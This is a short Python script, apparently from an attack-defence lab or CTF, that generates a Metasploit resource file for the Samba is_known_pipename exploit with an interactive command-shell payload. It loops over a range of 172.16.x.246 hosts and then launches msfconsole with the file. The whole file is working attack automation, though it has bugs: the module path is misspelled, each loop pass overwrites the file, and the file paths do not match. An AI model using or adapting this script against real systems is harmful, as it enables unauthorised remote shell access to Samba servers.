import os

print ("start")
def at(config):
    myhost = "172.16.103.2"
    for ip3 in range(106,116):
        host = "172.16."+str(ip3)+".246"
        config = open('1.rc','w')
        config.write('use eexploit/linux/samba/is_known_pipename'+"\n")
        config.write('set PAYLOAD cmd/unix/interact'+"\n")
        config.write('set RHOST '+host+"\n")
        config.write('set LHOST '+myhost+"\n")
        config.write('exploit'+"\n")
at('')

def main():
    mg = os.system('msfconsole -r /root/1.rc') 

if __name__ == "__main__":
    main()
    